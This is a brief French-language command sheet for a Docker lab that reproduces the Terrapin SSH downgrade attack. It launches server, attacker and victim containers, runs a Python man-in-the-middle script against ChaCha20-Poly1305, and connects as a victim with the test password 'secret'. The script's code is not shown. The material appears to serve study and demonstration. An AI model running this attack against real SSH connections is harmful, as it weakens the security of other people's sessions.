# commandes

## Démarage

### lancement des conteneurs :
`docker-compose up -d`
`docker-compose ps`

### récupération des ip du serveur et de l'attaquant (pour lancer le script)
`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' terrapin-attack_serveur_1`
`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' terrapin-attack_attaquant_1`

## Lancement de 3 terminal diff

### terminal server
`docker logs terrapin-attack_serveur_1 -f`

### terminal attaquant
`docker attach terrapin-attack_serveur_1`
```
python3 ext-downgrade/ext_downgrade_chacha20_poly1305.py \
    --proxy-ip {ip_attaquant} \
    --server-ip {ip_serveur}
```

### terminal victime
`docker attach terrapin-attack_victime_1`
`PATH="$PATH:/install/bin/"`
`ssh victim@172.24.0.2 -vvv -o Ciphers=chacha20-poly1305@openssh.com` (passwd is 'secret')

